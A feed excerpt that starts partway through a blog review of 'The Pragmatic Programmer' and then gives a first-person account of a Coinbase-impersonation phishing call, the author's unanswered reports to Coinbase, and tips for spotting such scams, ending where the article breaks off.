<p>Some languages, such as Clojure have built-in semantics for design by contract, with explicit pre- and post- conditions. However, if your language doesn’t support contracts, you can implement them with <strong>Tip 39: Use Assertions to Prevent the Impossible</strong>. You can assert that the conditions of your contract are true, and handle the cases where the contract is violated. If you don’t know what to do when a contract is violated, the authors recommend <strong>Tip 38: Crash Early</strong>. It’s better that you crash rather than write incorrect data to the database. After all, dead programs tell no lies. Of course, crashing immediately may not be appropriate - if you have resources open make sure to close them before exiting.</p>

<p>The final paranoid tip is <strong>Tip 43: Avoid Fortune-Telling</strong>. Pragmatic programmers only make decisions that they can get immediate feedback on. The more predictions you make about the future, the more likely you’ll get some of the predictions wrong and make the wrong decision based on them.</p>

<blockquote>
  <p>You might find yourself slipping into fortune telling when you have to:</p>
  <ul>
    <li>Estimate completion dates months in the future</li>
    <li>Plan a design for future maintenance or extendability</li>
    <li>Guess user’s future needs</li>
    <li>Guess future tech availability</li>
  </ul>
</blockquote>

<h2 id="chapter-5-bend-or-break">Chapter 5: Bend, or Break</h2>

<p>In a previous chapter, the authors wrote about making decisions <em>reversible</em> and <em>easier to change</em>. This chapter tells you how to implement it in your code. The key here is to make your code flexible rather than rigid - good code bends to circumstances rather than breaks. Part of this is <em>decoupling</em> code. Code is consider coupled when they share something in common. This may be something as simple as a shared global variable, or something more complex like an inheritance chain.</p>

<p>The authors argue against what they term <em>Train Wrecks</em> - long chains of method calls, such as this example they give:</p>

<div><pre><code>public void applyDiscount(customer, order_id, discount) { 
	totals = customer
			  .orders 
			  .find(order_id) 
			  .getTotals();

	totals.grandTotal = totals.grandTotal - discount;
	totals.discount = discount; 
}

</code></pre></div>

<p>This code is traversing many different levels of abstraction - you have to know that a customer object exposes orders, that orders have a <code>find</code> method, and that the order <code>find</code> returns has a <code>getTotal</code> method. If any of these levels of abstraction are changed, your code might break. And requirements may change; What if the business decides to implement a maximum discount amount of 40%? Certainly, this could be applied in the <code>applyDiscount</code> routine, but anything could modify the <code>grandTotal</code> and <code>discount</code> fields - this rule could be violated if other modules modifying the totals object don’t get the memo.</p>

<p>The authors suggest refactoring the code so that there is no orders object, just a <code>find</code> method and an applyDiscount method for the order object that implements the 40% rule:</p>

<div><pre><code>public void applyDiscount(customer, order_id, discount) { 
	customer
	.findOrder(order_id)
	.applyDiscount(discount); 
}
</code></pre></div>

<p>The authors suggest having only one . when you access something if that something is likely to change, such as anything in your application, or a fast moving external API. This includes using intermediate variables between accesses, such as this code:</p>

<div><pre><code># This is cheating!
orders = customer.orders
order = orders.find(order_id)
totals = order.getTotals
</code></pre></div>

<p>However, the rule does not apply to things that are unlikely to change, such as core language APIs. So this code is ok:</p>

<div><pre><code>people
.sort_by {|person| person.age } 
.first(10)
.map {| person | person.name }
</code></pre></div>

<p>Another source of coupling is globally accessible data. Global data makes it hard to reason about the state of a program, since any other module might be able to change it. Global data includes design patterns such as singletons, and external resources such as databases. Given how extensive global resources are, how can one avoid them? If global data is unavoidable, the key is to manage them through a well-defined API that you control, rather than allowing anything to read and write global data. In the words of <strong>Tip 48: If It’s Important Enough to Be Global, Wrap It in an API</strong>.</p>

<p>Poor use of inheritance is a third source of coupling. Inheritance is used for two reasons: code reuse and type modeling. Inheritance doesn’t work for code reuse; Not only is the code of a child class coupled to any ancestor of the class, so is any code that uses the class. Things may unexpectedly break when an ancestor changes an API, even if you are using a subclass.</p>

<p>Nor does inheritance work for modeling types. Class hierarchies quickly become tangled, wall covering monstrosities. Another problem is multiple inheritance. A <code>Car</code> may be a type of <code>Vehicle</code>, but it may be an <code>Asset</code> or <code>InsuredItem</code>. Multiple inheritance is required to model this, and many OO languages don’t support multiple inheritance. Instead of paying the inheritance tax, the authors suggest using:</p>

<ul>
  <li>Interfaces/Protocols</li>
  <li>Delegation</li>
  <li>Mixins/Traits</li>
</ul>

<p><em>Interfaces</em> or <em>Protocols</em> are classes that contain no code but instead contains behaviors. A class that implements an interface promises to define the behaviors. For example, a <code>Car</code> might implement <code>Drivable</code> which has methods such as <code>accelerate</code> and <code>brake</code>. Interfaces can be used as types, and any class that implements the interface will be compatible with that type. This is a much easier way to provide polymorphism than inheritance.</p>

<p>Another alternative to inheritance is <em>delegation</em>. If you want to include behavior from class <code>Foo</code> add a member of type <code>Foo</code> to your class rather than inherit from <code>Foo</code>. You can then use Foo’s API wrapped in code you control. Delegation is a <em>has-a</em> relationship rather than a <em>is-a</em> relationship.</p>

<p>The problem with interfaces and delegation is that they require writing lots of boilerplate code. For example, it’s likely that most of your classes that implement <code>Drivable</code> will have the same logic for <code>brake</code>, but each class will have to write it’s own implementation of <code>brake</code>. This leads to repeated code across your codebase, violating the DRY principle. To resolve this, the authors turn to <em>Mixins</em> - sets of functions that can be “mixed into” a class. This allows you to add common functionality without using inheritance. I wonder how mixins are implemented in a language like Java, which doesn’t have an obvious version of that feature. It’s also not clear to me how mixins are different from inheritance; aren’t they just a form of multiple inheritance?</p>

<p><strong>Tip 55: Parameterize Your App Using External Configuration</strong>: Code may have values that change while the application is running, such as credentials for for third-party services. Rather than directly including the values in your code, you should externalize them and put them in a configuration bucket. Keeping credentials in source code is a security risk - hackers scan public git repositories for common security credentials, such as AWS keys. It’s common to store them in a flat file or database tables, and read them when the application initializes. However, in our world of highly-available applications that’s not as appropriate. Instead the authors propose configuration-as-a-service, where configuration is stored behind a service API. This allows multiple applications to share configuration information, use access control to control who can see and edit configuration, and provide a UI to easily edit config information. Using the configuration service, applications can subscribe to a configuration item and get notifications when they change. This allows applications to update config data on their side without restarting.</p>

<h2 id="chapter-6-concurrency">Chapter 6: Concurrency</h2>

<p>This chapter deals with <em>Parallelism</em>, where two pieces of code run at the same time, and <em>Concurrency</em>, where things act as if they run at the same time. In the real world, things are asynchronous - the user is supplying input, network resources are called, and the screen is being redrawn all at the same time. Applications that run everything serially feel sluggish.</p>

<p>In <strong>Tip 56: Analyze Workflow to Improve Concurrency</strong> the authors advocate that you break temporal coupling where possible. <em>Temporal Coupling</em> is when your code depends on event A happening before event B. You should look at your workflow to see what can be executed concurrently. Look for activities that take a lot of time that would allow for something else to be done in the meantime. If your application makes multiple independent API calls to a remote service, execute them on separate threads rather than serially, then gather up the results of each call. If your workflow allows a way to split the work into multiple independent units, take advantage of those multiple cores and execute them in parallel.</p>

<p>Of course, parallelism has its pitfalls as well. For example, imagine reading an integer, incrementing it, and writing it back. If two processes read that integer at the same time, they will each increment the value to n+1, when you want it to be n+2. The update needs to be atomic; each process needs to do this sequentially without the other process interfering. This can be done through synchronized methods, semaphores, or other forms of resource locking. However, they have their own dangers as well, such as deadlocking, where two processes each get a lock on one of two needed resources, but not the other. Each waits forever for the other to release its lock. The authors think you should avoid shared state rather than try to handle yourself wherever possible; <strong>Tip 57: Shared State Is Incorrect State</strong>.</p>

<p>The authors ran into this issue when writing the 20th anniversary edition: they updated the build process for the book to utilize parallelism. However, the build would randomly fail. The authors tracked this down to changing the directory temporarily. In the original, a subtask would change directory, then go back to the original directory. However, this no longer worked when new threads started, expecting to be in the root directory. Depending on the timing, this could break the build. This prompted them to write <strong>Tip 58: Random Failures Are Often Concurrency Issues</strong>.</p>

<h2 id="chapter-7-while-you-are-coding">Chapter 7: While You Are Coding</h2>

<p>This chapter is more of a grab-bag. It covers subjects such as psychology, big-O notation, refactoring, security, and testing.</p>

<p>In <strong>Tip 61: Listen to Your Inner Lizard</strong> the authors talk about listening to your instincts (your lizard-brain). If you find yourself having a hard time writing code, your brain is trying to tell you something. Perhaps the structure or design is wrong, or you don’t fully understand the requirements. If you find yourself in this situation, take a step back and think about what you are doing. Maybe go for a walk, or sleep on it. You might find that the solution is staring you in the face when you come back.</p>

<p>Perhaps you need to refactor the code instead of writing more. Refactoring is a continuous process, espoused in <strong>Tip 65: Refactor Early, Refactor Often</strong>. If anything strikes you as wrong in your code, such as DRY violations, outdated knowledge or non-orthogonal design, don’t hesitate to fix it. When you are refactoring, make sure you have a good suite of unit tests beforehand to test if your changes break anything. Run the tests frequently to check if you’ve broken anything.</p>

<p>Speaking of tests, the authors start with a bold assertion: <strong>Tip 67: Testing Is Not About Finding Bugs</strong>. Instead, tests function as <em>the First User of Your Code</em> - a source of immediate feedback, and immediately forces you to think about what counts as a correct solution. In addition, tightly coupled code tends to be hard to test, so it helps you make good design decisions. The authors emphatically do not think you should adopt full-on Test Driven Development - it’s too easy to become a slave to writing tests. They note an example of a TDD advocate starting a sudoku solver using TDD and spent so much time writing the tests they failed to write the solver itself!</p>

<p>In a sidebar, Dave Thomas explains that he stopped writing tests for a few months, and said “not a lot” happened. The quality didn’t drop, nor did he introduce bugs into the code. His code was still testable, it just wasn’t tested.</p>

<blockquote>
  <p>Andy says I shouldn’t include this sidebar. He worries it will tempt inexperienced developers not to test. Here’s my compromise:
Should you write tests? Yes. But after you’ve been doing it for 30 years, feel free to experiment a little to see where the benefit lies for you.</p>
</blockquote>

<h2 id="chapter-8-before-the-project">Chapter 8: Before the Project</h2>

<p>This chapter focuses on how to start your project on the right foot. The first subject the authors tackle is requirements gathering: <em>The Requirements Pit</em>. While we talk about gathering requirements as if they are on the ground, waiting to be picked up, requirements are non-obvious because of <strong>Tip 75: No One Knows Exactly What They Want</strong>. They think of requirements gathering as a kind of therapy, where you take an initial requirement and ask questions about the details to nail down exactly what they need. The authors show an example of a simple requirement: <em>“Shipping should be free on all orders costing  <span>$</span>50 or more”</em>. Does that include the shipping cost itself? Tax? If you’re selling ebooks as well, should they be included? The job of the programmer is <strong>Tip 76: Programmers Help People Understand What They Want</strong>. You should find any edge cases the client may not have considered and make sure they’re documented. This doesn’t mean creating long specifications the client won’t read. Instead, the authors think requirements should be able to fit on an index card. This helps prevent feature creep; if the client understands how adding one more index card will impact the schedule, they’ll consider the tradeoffs and prioritize the requirements they need the most.</p>

<p>You are given constraints in your requirements as well. Your job as a software engineer is to evaluate if those constraints are things you actually have to live with or if you can relax them. In the words of <strong>Tip 81: Don’t Think Outside the Box—Find the Box</strong>, the constraints are the edges of the box. What you initially thought of as a constraint may actually be an assumption you held.</p>

<p>Another tip the authors advocate for is <strong>Tip 78: Work with a User to Think Like a User</strong>. If you’re building an inventory system, work in the warehouse for a few days to get an idea of their processes and how your system will be used. If you don’t understand how it will be used, you could create something that meets all of the requirements but is totally useless. They cite an example of a digital sound mixing board that could do anything to sound that was possible, yet nobody wanted to use it. Rather than take advantage of recording engineers’ experience with tactile sliders and knobs, they built an interface that was unfamiliar to them. Each feature was buried behind menus and given unintuitive names. &nbsp;It did <em>what</em> was required, but didn’t do it <em>how</em> it was required.&nbsp;</p>

<p>The authors also consider in this chapter what it means to be Agile. Many teams and companies are eager for an off-the-shelf solution: call it Agile-in-a-Box. But no process can make you Agile; “Use this process and you’ll be agile” ignores a key part of the Agile manifesto: <em>Individuals and interactions over processes and tools</em>. To the authors Agile can be boiled down to the following:</p>

<blockquote>
  <ol>
    <li>Work out where you are.</li>
    <li>Make the smallest meaningful step towards where you want to be.</li>
    <li>Evaluate where you end up, and fix anything you broke.</li>
  </ol>
</blockquote>

<p>Do this for every level of what you do, from process to code, and you’ll have adopted the Agile spirit.</p>

<h2 id="chapter-9-pragmatic-projects">Chapter 9: Pragmatic Projects</h2>

<p>Can the lessons of <em>The Pragmatic Programmer</em> be applied to teams too? The authors say yes. This chapter focuses on how to apply the lessons of the previous chapters to the team level. Many of the lessons are the same as those mentioned previously, so I won’t go into them again.</p>

<p>The authors advise <strong>Tip 87: Do What Works, Not What’s Fashionable</strong>. Just because Google or Facebook adopts process $ x $ doesn’t mean it’s right for your team. How do you know if something works? Try it. Pilot an idea with a small team, and see what works about it and what doesn’t. The goal isn’t to “do Scrum” or “be Agile”, but to deliver working software continuously. When you adopt a new idea, you should do it with improving continuous deployment of software in mind. If you’re measuring your deployments in months, try to get it down to weeks instead. Once you get it down to weeks, try to deliver in one-week iterations.</p>

<p>Related to continuously delivering software is <strong>Tip 96: Delight Users, Don’t Just Deliver Code</strong>. Delivering working software in a timely matter is not enough to delight your users; that is merely meeting expectations. The authors suggest you ask your users a question:</p>

<blockquote>
  <p>How will you know that we’ve all been successful a month (or a year, or whatever) after this project is done?</p>
</blockquote>

<p>The answer may not be related to the requirements, and may surprise you. For example, a recommendations engine might be valued on driving customer retention. But once you know what the secret to success is, you should aim not just to hit the goal but to exceed it.</p>

<p>Finally, take pride in your work. The final tip of the book is <strong>Tip 97: Sign Your Work</strong>.</p>

<h2 id="final-thoughts">Final Thoughts</h2>

<p>I was only able to cover a portion of this remarkable book in this review. I highly recommend this book to any software engineer, especially to those just starting out in the field. It makes a great graduation gift to someone just finishing their CS degree.</p>


    <hr>
     <p><a href="https://www.ahalbert.com/reviews/2023/11/25/family_and_borghesia.html">&lt;&lt; Previous </a> 
     <span><a href="https://www.ahalbert.com/reviews/2023/12/29/and_the_band_played_on.html"> Next &gt;&gt;</a> </span></p>
</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[I have recordings proving Coinbase knew about breach months before disclosure (595 pts)]]></title>
            <link>https://jonathanclark.com/posts/coinbase-breach-timeline.html</link>
            <guid>45948058</guid>
            <pubDate>Sun, 16 Nov 2025 20:18:10 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://jonathanclark.com/posts/coinbase-breach-timeline.html">https://jonathanclark.com/posts/coinbase-breach-timeline.html</a>, See on <a href="https://news.ycombinator.com/item?id=45948058">Hacker News</a></p>
<div id="readability-page-1" class="page"><article>
                    <p><img src="https://jonathanclark.com/images/coinbase-breach/hero-timeline.png" alt="Coinbase data breach timeline investigation">
                    </p>
                    
                    <h2>The Call That Changed Everything</h2>
                    
                    <p>On January 7, 2025, at 5:02 PM, I received an email with a subject line that immediately caught my attention:</p>
                    
                    <blockquote>
                        <p><strong>"Order N54HJG3V: Withdrawal of 2.93 ETH initiated. A representative will be in touch shortly before we mark the payment completed"</strong></p>
                    </blockquote>
                    
                    <p>Minutes later, my phone rang. The caller ID showed 1-805-885-0141. An American-sounding woman who identified herself as a Coinbase fraud prevention representative said someone had initiated a large transfer from my account and she was calling to confirm.</p>
                    
                    <p>What happened next was chilling: <strong>She knew my social security number. She knew my Bitcoin balance down to the decimal point. She knew personal details that should have been impossible for a scammer to possess.</strong></p>
                    
                    <p>This wasn't just another phishing attempt. This was something far more sophisticated.</p>

                    <hr>

                    <h2>The Timeline That Doesn't Make Sense</h2>
                    
                    <p>Here's where the story gets interesting—and troubling:</p>
                    
                    <ul>
                        <li><strong>January 7, 2025:</strong> I was attacked by scammers with detailed personal information</li>
                        <li><strong>January 7, 2025:</strong> I reported the attack to Coinbase security@coinbase.com</li>
                        <li><strong>January 7, 2025 (same day):</strong> Brett Farmer, Head of Trust &amp; Safety, responded: "This report is super robust and gives us a lot to look into. We are investigating this scammer now."</li>
                        <li><strong>January 13, 2025:</strong> I asked Coinbase: "How did the attacker know the balance of my bitcoin holdings?" <em>(No response)</em></li>
                        <li><strong>January 17, 2025:</strong> I followed up again, asking for a reply <em>(No response)</em></li>
                        <li><strong>January 22, 2025:</strong> Still no answer to my critical question <em>(No response)</em></li>
                        <li><strong>January 29, 2025:</strong> I asked again: "Could I please get a response?" <em>(No response)</em></li>
                        <li><strong>May 11, 2025:</strong> Coinbase says they became aware of the breach (when attackers demanded $20M ransom)</li>
                        <li><strong>May 15, 2025:</strong> Coinbase publicly disclosed the breach</li>
                    </ul>
                    
                    <p><strong>That's a four-month gap.</strong></p>
                    
                    <p>For four months, I had concrete evidence that attackers possessed detailed Coinbase customer data. For four months, I repeatedly asked Coinbase to explain how this was possible. And for four months, my questions went unanswered.</p>
                    
                    <p><strong>Coinbase never replied to a single follow-up email after Brett Farmer's initial response.</strong> Despite his promise that they were "investigating this scammer," the most important question—how the attacker obtained my private account data—was met with complete silence.</p>

                    <hr>

                    <h2>What We Now Know About the Breach</h2>
                    
                    <p>In May 2025, Coinbase finally disclosed what had happened: cybercriminals had bribed overseas customer support contractors—particularly employees at TaskUs in India—to steal sensitive customer data.</p>
                    
                    <p>The compromised information included:</p>
                    <ul>
                        <li>Names, addresses, and phone numbers</li>
                        <li>Email addresses</li>
                        <li>Last four digits of Social Security numbers</li>
                        <li>Government-issued ID images</li>
                        <li>Account balances</li>
                        <li>Transaction histories</li>
                    </ul>
                    
                    <p>Coinbase estimated the financial impact at <strong>$180-400 million</strong>, affecting less than 1% of their customer base. Over 200 TaskUs employees were ultimately terminated.</p>
                    
                    <p>But here's the crucial question: <strong>If attackers were actively using stolen data to target customers in January, when did the actual breach occur? And when did Coinbase first become aware that something was wrong?</strong></p>

                    <hr>

                    <h2>What I Reported to Coinbase</h2>
                    
                    <p>On January 7, 2025, immediately after recognizing the attack, I sent a comprehensive security report to Coinbase's security team. This wasn't a vague complaint—it was a detailed technical analysis that should have raised immediate red flags about a data breach.</p>
                    
                    <p><strong>My report included:</strong></p>
                    
                    <ul>
                            <li><strong>Full email headers:</strong> Complete technical headers showing the email was routed through Amazon SES (a32-86.smtp-out.amazonses.com), not Coinbase's own mail servers, despite appearing to come from commerce@coinbase.com</li>
                            
                            <li><strong>DKIM signature analysis:</strong> Documentation that while the email passed DKIM validation for both coinbase.com and amazonses.com, the actual sending infrastructure was suspicious</li>
                            
                            <li><strong>The phishing email content:</strong> The complete HTML email with its fake "suspicious activity" warning and fraudulent transaction details (Order N54HJG3V, 2.93 ETH withdrawal)</li>
                            
                            <li><strong>Phone number used:</strong> 1-805-885-0141 (later confirmed to be a Google Voice number)</li>
                            
                            <li><strong>Voice recording:</strong> An audio recording of my second call with the scammer, capturing the entire conversation where she demonstrated knowledge of my personal information</li>
                            
                            <li><strong>Specific data the attacker possessed:</strong> A detailed list of what the scammer knew, including:
                                <ul>
                                    <li>My Social Security number</li>
                                    <li>My exact Bitcoin balance</li>
                                    <li>My account signup date</li>
                                    <li>Driver's license information</li>
                                    <li>The amount of the fabricated "suspicious transfer"</li>
                                </ul>
                            </li>
                            
                            <li><strong>Attack methodology:</strong> Description of their social engineering tactics, including the attempt to get me to move funds to "a cold wallet" by downloading Coinbase Wallet</li>
                            
                            <li><strong>Red flags I identified:</strong> The inability of the caller to authenticate herself, the Google Voice callback number, the lack of any notifications in my actual Coinbase account</li>
                            
                            <li><strong>Post-call SMS flooding:</strong> Documentation that immediately after the call, I received hundreds of spam text messages for random service signups—a potential attempt to hide legitimate 2FA codes or security alerts in the noise</li>
                    </ul>
                    
                    <p>This wasn't a typical phishing report. <strong>I specifically highlighted that the attacker had access to non-public account information that should have been impossible to obtain without either a device compromise on my end or a data breach at Coinbase.</strong></p>
                    
                    <p>Brett Farmer, Coinbase's Head of Trust &amp; Safety, responded the same day, calling it a "super robust" report that gave them "a lot to look into."</p>
                    
                    <p>But when I followed up six days later with the key question—<em>"How did the attacker know the balance of my bitcoin holdings?"</em>—the conversation ended. That question, which should have immediately triggered an internal investigation into potential data compromise, was never answered.</p>

                    <hr>

                    <h2>The Attack: A Perfect Impersonation</h2>
                    
                    <p>The sophistication of this attack cannot be overstated. Let me walk you through what made it so convincing—and what ultimately saved me.</p>
                    
                    <h3>The Email: Remarkably Convincing</h3>
                    
                    <p>The phishing email I received looked completely legitimate at first glance:</p>
                    
                    <ul>
                        <li><strong>From:</strong> Coinbase Commerce &lt;commerce@coinbase.com&gt;</li>
                        <li><strong>DKIM signatures:</strong> Passed validation for both coinbase.com and amazonses.com</li>
                        <li><strong>Professional formatting:</strong> Perfect HTML layout, correct branding, legitimate-looking transaction details</li>
                        <li><strong>Convincing narrative:</strong> "We detected suspicious activity on your account. A fraud prevention representative will be in touch shortly..."</li>
                    </ul>
                    
                    <p>The email even included what appeared to be a verification code (96841) and assigned me a specific case agent ("Sarah Schueler"). This level of detail gave it tremendous credibility.</p>
                    
                    <h3>The Critical Red Flag: Amazon SES</h3>
                    
                    <p>But when I examined the email headers more carefully, I found something suspicious:</p>
                    
                    <pre>Received: from a32-86.smtp-out.amazonses.com (a32-86.smtp-out.amazonses.com. [54.240.32.86])
Return-Path: &lt;01000194436f122c-535a7ce0-f493-41c2-b966-dcaa1a9e6b57-000000@amazonses.com&gt;
                    </pre>
                    
                    <p>The email was sent through <strong>Amazon SES (Simple Email Service)</strong>, not Coinbase's own servers. While Coinbase might use Amazon infrastructure, this raised my suspicion. A legitimate security-critical email about fraud should come through more controlled channels.</p>

                    <h3>The Phone Call: Even More Convincing (And Recorded)</h3>
                    
                    <p>When the woman called me, she was professional, intelligent, and sounded exactly like a legitimate customer service representative. She had information that seemed impossible for a scammer to possess:</p>
                    
                    <ul>
                        <li>My exact Bitcoin balance</li>
                        <li>My account signup date</li>
                        <li>My driver's license details</li>
                        <li>My Social Security number</li>
                        <li>The amount of the "suspicious transfer" (2.93 ETH)</li>
                    </ul>
                    
                    <p>During our conversation, I asked her to authenticate herself. Here's where things got interesting.</p>

                    <hr>

                    <h2>How I Detected It Was a Scam</h2>
                    
                    <p>Despite the sophistication of the attack, several red flags eventually convinced me this was fraudulent:</p>
                    
                    <h3>Red Flag #1: The Authentication Problem</h3>
                    
                    <p>I asked the caller to prove she was from Coinbase. She offered to read me my personal information—but I already knew she had that information. That's not authentication; that's just proving she has stolen data.</p>
                    
                    <p>When I suggested she send me an email from a verified Coinbase address that I could reply to, she claimed she didn't have access to personal email addresses and could only use generic support channels. <strong>A fraud prevention specialist without the ability to send verified emails? That didn't add up.</strong></p>
                    
                    <h3>Red Flag #2: The Callback Issue</h3>
                    
                    <p>When I asked if I could call her back, she said I couldn't reach her because she was "in the fraud department." After the call, I tried calling the number back: <strong>it was a Google Voice number.</strong></p>
                    
                    <p>Legitimate financial institutions always provide callback numbers that route to their main systems. A Google Voice number is a massive red flag.</p>
                    
                    <h3>Red Flag #3: Email Verification Confusion</h3>
                    
                    <p>When I challenged the authenticity of the email sender, the caller insisted that Amazon was just Coinbase's "service provider" and that the DKIM signatures proved legitimacy. But when pressed, she couldn't explain away the anomalies in a satisfactory way.</p>
                    
                    <p>The conversation on the recorded call shows my growing skepticism:</p>
                    
                    <blockquote>
                        <p><strong>Me:</strong> "I don't think there is enough information provided for me to authenticate you."</p>
                        <p><strong>Caller:</strong> "I'm not sure what you would like me to do..."</p>
                        <p><strong>Me:</strong> "There are just too many red flags."</p>
                    </blockquote>
                    
                    <h3>Red Flag #4: No Notifications in My Account</h3>
                    
                    <p>After the call, I logged into my actual Coinbase account. There were:</p>
                    <ul>
                        <li>No notifications about the alleged transfer</li>
                        <li>No new login attempts</li>
                        <li>No new authorized devices</li>
                        <li>No actual transaction matching what the caller described</li>
                    </ul>
                    
                    <p>If this were real, there would have been notifications everywhere.</p>
                    
                    <h3>Red Flag #5: The Pressure to Use Coinbase Wallet</h3>
                    
                    <p>The caller wanted me to move my cryptocurrency to "a cold wallet" and started walking me through downloading Coinbase Wallet. <strong>This is a classic social engineering tactic—get the victim to move funds to an address controlled by the attacker.</strong></p>
                    
                    <p>I didn't follow through, so I never discovered exactly how they planned to steal the funds, but the intent was clear.</p>

                    <hr>

                    <h2>The SMS Flooding Attack: A Sinister Twist</h2>
                    
                    <p>Here's where things got even more concerning. Immediately after I ended the call with the scammer, <strong>my phone was bombarded with hundreds of text messages—random service signups, verification codes, newsletters, everything imaginable.</strong></p>
                    
                    <p>At first, I thought this was just a vindictive "FU" from the scammer. But the timing and volume suggest something more calculated: <strong>SMS flooding is a known technique to hide legitimate security alerts in noise.</strong></p>
                    
                    <p>The attack works like this:</p>
                    <ol>
                        <li>Scammer floods your phone with spam texts</li>
                        <li>While you're overwhelmed, they attempt account takeovers on various services</li>
                        <li>Real 2FA codes and security alerts get buried in the flood</li>
                        <li>You miss the critical warnings because they're hidden among hundreds of spam messages</li>
                    </ol>
                    
                    <p>This could have been an attempt to:</p>
                    <ul>
                        <li>Hijack my SMS-based two-factor authentication</li>
                        <li>Hide real alerts from Coinbase or other services</li>
                        <li>Overwhelm me while they attempted unauthorized access to various accounts</li>
                        <li>Create confusion and distract from their next moves</li>
                    </ul>
                    
                    <p><strong>This wasn't just a phishing call—it was a coordinated, multi-vector attack.</strong></p>

                    <hr>

                    <h2>What Coinbase Got Wrong</h2>
                    
                    <p>Coinbase's handling of this breach raises serious questions:</p>
                    
                    <h3>1. Outsourcing Security-Sensitive Roles</h3>
                    
                    <p>Customer support agents at third-party contractors had access to extremely sensitive data: Social Security numbers, account balances, transaction histories, and personal documents. <strong>Why were overseas contractors given such privileged access?</strong></p>
                    
                    <p>The economics of the bribery scheme tell the story: attackers likely paid relatively small amounts to contractors earning modest wages to access data they then used to attempt thefts worth potentially millions.</p>
                    
                    <h3>2. Failed Detection Systems</h3>
                    
                    <p>Coinbase claims they "discovered" the breach on May 11, 2025, when attackers attempted to extort $20 million. But my case—and likely many others—proves the breach was being actively exploited months earlier.</p>
                    
                    <p><strong>What monitoring systems failed to detect that customer data was being used in sophisticated phishing attacks?</strong> I reported this in January with specific details about how the attacker knew my information. That report should have triggered alarm bells.</p>
                    
                    <h3>3. Inadequate Response to User Reports</h3>
                    
                    <p>On January 7, 2025, I submitted a detailed security report to Coinbase. Brett Farmer, Head of Trust &amp; Safety, responded on January 7:</p>
                    
                    <blockquote>
                        <p>"Hey Jonathan, I just wanted to send a personal note and thank you for this information. This report is super robust and gives us a lot to look into. We are investigating this scammer now."</p>
                    </blockquote>
                    
                    <p>But when I followed up with the critical question—"How did the attacker know the balance of my bitcoin holdings?"—my subsequent emails went unanswered:</p>
                    
                    <ul>
                        <li>January 13: "Do you have any updates on this incident?"</li>
                        <li>January 17: "Could I please get a reply on my question below?"</li>
                        <li>January 22: "Could I please get an update to my question as to how the attacker was able to determine my coinbase bitcoin balance?"</li>
                        <li>January 29: "Could I please get a response?"</li>
                    </ul>
                    
                    <p><strong>My question was specific and technical. It went to the heart of what should have been a massive red flag: How did attackers have access to non-public account data?</strong></p>
                    
                    <p>Had Coinbase investigated this seriously in January, they might have discovered the insider threat months earlier and prevented additional victims.</p>
                    
                    <h3>4. The Disclosure Timeline</h3>
                    
                    <p>Coinbase says they "became aware" of the breach on May 11, 2025. But my January attack proves the breach was active at least four months earlier. This raises uncomfortable questions:</p>
                    
                    <ul>
                        <li>When did the actual data exfiltration occur? Late 2024?</li>
                        <li>How many other victims reported similar attacks between January and May?</li>
                        <li>Were those reports properly escalated and investigated?</li>
                        <li>Would Coinbase have disclosed the breach if not for the extortion attempt?</li>
                    </ul>

                    <hr>

                    <h2>Lessons Learned: How to Protect Yourself</h2>
                    
                    <p>The sad reality is that when a major platform gets breached, your personal information may already be in attackers' hands. But you can still protect yourself from falling victim to the scams that follow:</p>
                    
                    <h3>1. Never Trust Caller ID</h3>
                    
                    <p>Phone numbers can be spoofed. Even if the caller ID shows a legitimate company, don't trust it. Always hang up and call back using a number you independently verify (from the company's official website, not from the email or caller).</p>
                    
                    <p><strong>Pro tip:</strong> Ask the caller for their callback number, then look up that number online before calling it back. Search for "[phone number] scam" or "[phone number] reviews" to see if others have reported it as fraudulent. In my case, when I called back the number the scammer gave me (1-805-885-0141), it turned out to be a Google Voice number—an instant red flag. Legitimate corporate support lines won't use Google Voice.</p>
                    
                    <h3>2. Understand That Scammers May Have Your Personal Info</h3>
                    
                    <p>In the age of massive data breaches, assume attackers may know:</p>
                    <ul>
                        <li>Your name, address, phone number, email</li>
                        <li>Last 4 digits of your SSN</li>
                        <li>Your account balances and transaction history</li>
                        <li>Other "secret" information you thought was secure</li>
                    </ul>
                    
                    <p><strong>Just because someone knows this information doesn't mean they're legitimate.</strong> Authentication needs to work both ways.</p>
                    
                    <h3>3. Verify Email Headers</h3>
                    
                    <p>Learn to check email headers. Look for:</p>
                    <ul>
                        <li>The actual sending server (not just the "From" address)</li>
                        <li>SPF, DKIM, and DMARC validation results</li>
                        <li>Unusual routing or relay servers</li>
                    </ul>
                    
                    <p>In my case, the Amazon SES sending address was the tip-off, even though DKIM signatures technically validated.</p>
                    
                    <p><strong>Pro tip:</strong> If you're not sure how to interpret email headers, copy the full headers and paste them into a good AI assistant (like ChatGPT or Claude) and ask: "Analyze these email headers and tell me if there are any red flags or signs this could be a phishing email." AI tools are excellent at spotting anomalies in technical data like email routing.</p>
                    
                    <h3>4. Demand Proper Authentication</h3>
                    
                    <p>If someone calls claiming to be from your bank, exchange, or other financial institution, <strong>they should be able to authenticate themselves to you, not just read back information they already have.</strong></p>
                    
                    <p>Legitimate companies can:</p>
                    <ul>
                        <li>Send you emails from verified domain addresses you can reply to</li>
                        <li>Provide callback numbers that route through their main system</li>
                        <li>Verify their identity through the app or website you're already logged into</li>
                    </ul>
                    
                    <h3>5. Check Your Account Directly</h3>
                    
                    <p>If someone alerts you to suspicious activity, don't trust the email or call. Open a browser, type in the company's URL directly (don't click links), log in, and check for yourself. If there's really a problem, it will show up in your account.</p>
                    
                    <h3>6. Never Move Funds Under Pressure</h3>
                    
                    <p>Legitimate companies will never pressure you to immediately move your funds, download software, or take urgent action to "protect" your account. <strong>That pressure is the scam.</strong></p>
                    
                    <h3>7. Use App-Based or Hardware 2FA, Not SMS</h3>
                    
                    <p>My experience with SMS flooding shows why SMS-based two-factor authentication is vulnerable. Use:</p>
                    <ul>
                        <li>Hardware security keys (YubiKey, Titan)</li>
                        <li>Authenticator apps (Google Authenticator, Authy)</li>
                        <li>Platform-specific authentication (like Coinbase's app-based approval)</li>
                    </ul>
                    
                    <p>SMS can be hijacked, flooded, or intercepted.</p>
                    
                    <h3>8. Report Everything</h3>
                    
                    <p>If you're targeted by a sophisticated attack, report it immediately and provide as much detail as possible:</p>
                    <ul>
                        <li>Full email headers</li>
                        <li>Phone numbers used</li>
                        <li>Specific information the attacker knew</li>
                        <li>Recording of calls if possible (check your local laws)</li>
                    </ul>
                    
                    <p>Your report might be the data point that helps the company detect a breach.</p>

                    <hr>

                    <h2>The Bigger Picture</h2>
                    
